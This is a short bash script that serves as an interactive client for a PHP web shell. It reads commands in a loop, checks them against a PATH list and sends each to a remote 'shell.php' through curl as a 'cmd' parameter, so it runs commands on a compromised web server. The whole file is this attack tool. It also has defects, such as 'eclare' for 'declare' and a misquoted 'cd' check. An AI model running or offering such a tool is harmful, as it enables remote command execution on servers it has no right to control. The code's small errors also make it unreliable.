#!/bin/bash

#Colors
eclare -r greenColor="\e[0;32m\033[1m"
declare -r endColor="\033[0m\e[0m"
declare -r redColor="\e[0;31m\033[1m"
declare -r blueColor="\e[0;34m\033[1m"
declare -r yellowColor="\e[0;33m\033[1m"
declare -r purpleColor="\e[0;35m\033[1m"
declare -r turquoiseColor="\e[0;36m\033[1m"
declare -r grayColor="\e[0;37m\033[1m"

# Global variables
declare -r myPath='/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

# Exit with ctrl_c
trap ctrl_c INT

function ctrl_c(){
    echo -e "\n${redColor} [!] Exiting...${endColor}"
    exit 1
}
function makeRequest(){
    echo -en "${blueColor}"
    curl "$url?cmd=$1"
    echo -en "${endColor}"
}
function obtainShell(){

    while [ "$command" != 'exit' ]; do

        declare -i counter=0; echo -en "${grayColor}$~ ${endColor}" && read -r command

        for path in $(echo $myPath | tr ':' ' '); do

            if [ -x $path/$(echo $command | awk '{print $1}') ]; then
                let counter+=1; break
            elif [ "$(echo $command) | awk '{print $1}')" == 'cd' ]; then
                let counter+=1; break
            fi
        done

        if [ "$counter" == '0' ]; then
            echo -e "${redColor} [!] Command $command not found ${endColor}"
        else
            command=$(echo $command | tr ' ' '+')
            makeRequest $command
        fi
    done; exit 0
}
# Help panel
function helpPanel(){
    echo -e "${yellowColor}\n\t[*] How to use"
    for i in {0..80}; do echo -en "-${endColor}"; done
    echo -e "${purpleColor}\n\n\t[-u] ${endColor}${blueColor}Specify url (-u http://127.0.0.1:8080/shell.php)${endColor}"
    echo -e "${purpleColor}\n\t[-h] ${endColor}${blueColor}Display this help panel${endColor}"
    exit 0
}
# Parameters and logic
declare -i parameterCounter=0; while getopts ":u:h:" arg; do
    case $arg in
        u) url=$OPTARG; let parameterCounter+=1 ;;
        h) helpPanel ;;
    esac
done

if [ "$parameterCounter" == '0' ]; then
    helpPanel
else
    obtainShell
fi
